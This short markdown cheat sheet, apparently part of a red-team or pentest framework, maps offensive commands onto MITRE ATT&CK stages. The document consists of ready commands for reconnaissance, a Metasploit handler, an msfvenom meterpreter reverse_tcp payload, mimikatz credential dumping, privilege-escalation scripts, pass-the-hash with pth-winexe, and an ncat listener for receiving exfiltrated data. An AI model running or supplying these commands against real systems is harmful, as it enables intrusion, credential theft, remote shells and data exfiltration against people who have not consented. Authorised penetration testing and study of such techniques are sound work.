# Framework MITRE ATT&CK Integration

## Reconnaissance (Initial Access)
- Banner Grabbing
  ```bash
  nmap -sV --script=banner {target}
  ```
- DNS Enumeration
  ```bash
  fierce -dns {domain}
  dnsenum {domain}
  ```
- OSINT Gathering
  ```bash
  theHarvester -d {domain} -l 500 -b all
  ```

## Execution
- Service Exploitation
  ```bash
  msfconsole -x "use exploit/multi/handler"
  ```
- Web Application Testing
  ```bash
  nikto -h {target}
  dirb http://{target}
  ```

## Persistence
- Backdoor Creation
  ```bash
  msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port}
  ```
- Credential Harvesting
  ```bash
  mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
  ```

## Privilege Escalation
- Linux Enumeration
  ```bash
  ./linpeas.sh
  ./linux-smart-enumeration/lse.sh -l 2
  ```
- Windows Enumeration
  ```bash
  ./winPEAS.exe
  PowerUp.ps1
  ```

## Lateral Movement
- Network Scanning
  ```bash
  nmap -sn {network}/24
  crackmapexec smb {network}/24
  ```
- Pass The Hash
  ```bash
  pth-winexe -U Administrator%{hash} //{target} cmd.exe
  ```

## Data Exfiltration
- Data Compression
  ```bash
  7z a -p{password} data.7z {target_files}
  ```
- Covert Channels
  ```bash
  ncat -lvp {port} > received_data
  ```